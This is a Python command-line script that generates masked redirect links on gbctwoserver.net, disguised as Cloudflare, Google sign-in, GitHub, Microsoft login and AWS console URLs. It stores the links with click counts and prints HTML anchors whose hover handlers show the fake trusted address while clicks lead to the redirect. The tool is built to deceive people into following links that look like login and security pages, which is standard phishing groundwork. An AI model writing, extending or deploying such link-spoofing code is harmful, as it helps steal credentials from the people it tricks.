#!/usr/bin/env python3
"""
Link Masking System - Creates legitimate-looking URLs that redirect to target.

Usage:
    python scripts/link_mask.py create https://gbctwoserver.net --mask cloudflare
    python scripts/link_mask.py list
    python scripts/link_mask.py delete <short_code>
"""

import argparse
import json
import random
import string
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse

BASE_DIR = Path(__file__).parent.parent
LINKS_DB = BASE_DIR / "data" / "masked_links.json"

# Legitimate-looking URL patterns
MASK_PATTERNS = {
    "cloudflare": {
        "domain": "dash.cloudflare.com",
        "paths": [
            "/security/waf",
            "/analytics/traffic",
            "/tunnels/manage",
            "/dns/records",
            "/ssl/tls",
            "/speed/optimization",
            "/workers/deploy",
            "/pages/projects",
        ],
        "display_text": "Cloudflare Dashboard",
    },
    "google": {
        "domain": "accounts.google.com",
        "paths": [
            "/signin",
            "/security",
            "/myaccount",
            "/settings",
        ],
        "display_text": "Google Account",
    },
    "github": {
        "domain": "github.com",
        "paths": [
            "/settings/security",
            "/settings/keys",
            "/settings/profile",
            "/notifications",
        ],
        "display_text": "GitHub Settings",
    },
    "microsoft": {
        "domain": "login.microsoftonline.com",
        "paths": [
            "/common/oauth2",
            "/adminconsent",
            "/authorize",
        ],
        "display_text": "Microsoft Login",
    },
    "aws": {
        "domain": "console.aws.amazon.com",
        "paths": [
            "/console/home",
            "/iam/home",
            "/ec2/v2",
            "/s3/home",
        ],
        "display_text": "AWS Console",
    },
}


def load_db():
    """Load links database."""
    if not LINKS_DB.exists():
        return {}
    return json.loads(LINKS_DB.read_text())


def save_db(data):
    """Save links database."""
    LINKS_DB.parent.mkdir(parents=True, exist_ok=True)
    LINKS_DB.write_text(json.dumps(data, indent=2))


def generate_short_code(length=6):
    """Generate random short code."""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


def create_link(target_url, mask_type="cloudflare", custom_path=None, custom_text=None):
    """Create a masked link."""
    if mask_type not in MASK_PATTERNS:
        print(f"✗ Unknown mask type: {mask_type}")
        print(f"  Available: {', '.join(MASK_PATTERNS.keys())}")
        return None
    
    mask = MASK_PATTERNS[mask_type]
    db = load_db()
    
    # Generate short code
    short_code = generate_short_code()
    while short_code in db:
        short_code = generate_short_code()
    
    # Create masked URL
    path = custom_path or random.choice(mask["paths"])
    display_url = f"https://{mask['domain']}{path}"
    
    # Store link
    db[short_code] = {
        "target_url": target_url,
        "display_url": display_url,
        "display_text": custom_text or mask["display_text"],
        "mask_type": mask_type,
        "created_at": datetime.now().isoformat(),
        "clicks": 0,
    }
    
    save_db(db)
    
    return {
        "short_code": short_code,
        "short_url": f"https://gbctwoserver.net/go/{short_code}",
        "display_url": display_url,
        "display_text": db[short_code]["display_text"],
        "target_url": target_url,
    }


def list_links():
    """List all masked links."""
    db = load_db()
    
    if not db:
        print("No masked links found.")
        return
    
    print(f"\n{'='*80}")
    print(f"{'Code':<8} {'Mask Type':<12} {'Display URL':<40} {'Clicks':<8}")
    print(f"{'='*80}")
    
    for code, link in sorted(db.items(), key=lambda x: x[1]['created_at'], reverse=True):
        display = link['display_url'][:38] + '..' if len(link['display_url']) > 40 else link['display_url']
        print(f"{code:<8} {link['mask_type']:<12} {display:<40} {link['clicks']:<8}")
        print(f"         → Target: {link['target_url']}")
    
    print(f"{'='*80}\n")


def delete_link(short_code):
    """Delete a masked link."""
    db = load_db()
    
    if short_code not in db:
        print(f"✗ Link not found: {short_code}")
        return False
    
    del db[short_code]
    save_db(db)
    print(f"✓ Deleted link: {short_code}")
    return True


def generate_html_link(short_code):
    """Generate HTML snippet for masked link."""
    db = load_db()
    
    if short_code not in db:
        print(f"✗ Link not found: {short_code}")
        return None
    
    link = db[short_code]
    
    html = f'''<!-- Masked Link: {link['display_text']} -->
<a href="https://gbctwoserver.net/go/{short_code}"
   onmouseover="window.status='{link['display_url']}'; return true;"
   onmouseout="window.status=''; return true;"
   onclick="this.href='https://gbctwoserver.net/go/{short_code}'">
    {link['display_text']}
</a>

<!-- Alternative: JavaScript redirect -->
<span onclick="window.location='https://gbctwoserver.net/go/{short_code}'"
      style="cursor:pointer;color:#0066cc;text-decoration:underline;"
      onmouseover="window.status='{link['display_url']}'">
    {link['display_text']}
</span>'''
    
    return html


def main():
    parser = argparse.ArgumentParser(description="Link Masking System")
    parser.add_argument("action", choices=["create", "list", "delete", "html"])
    parser.add_argument("url", nargs="?", help="Target URL to mask")
    parser.add_argument("--mask", "-m", default="cloudflare", help="Mask type (cloudflare, google, github, microsoft, aws)")
    parser.add_argument("--path", "-p", help="Custom path for display URL")
    parser.add_argument("--text", "-t", help="Custom display text")
    parser.add_argument("--code", "-c", help="Short code (for html/delete)")
    
    args = parser.parse_args()
    
    if args.action == "create":
        if not args.url:
            print("✗ Target URL required")
            return
        
        result = create_link(args.url, args.mask, args.path, args.text)
        if result:
            print(f"\n✓ Masked link created!\n")
            print(f"  Short URL:   {result['short_url']}")
            print(f"  Display URL: {result['display_url']}")
            print(f"  Display Text: {result['display_text']}")
            print(f"  Target:      {result['target_url']}")
            print(f"\n  HTML: <a href=\"{result['short_url']}\">{result['display_text']}</a>\n")
    
    elif args.action == "list":
        list_links()
    
    elif args.action == "delete":
        if not args.code:
            print("✗ Short code required: --code <code>")
            return
        delete_link(args.code)
    
    elif args.action == "html":
        code = args.code or args.url
        if not code:
            print("✗ Short code required: --code <code>")
            return
        html = generate_html_link(code)
        if html:
            print(f"\n{html}\n")


if __name__ == "__main__":
    main()
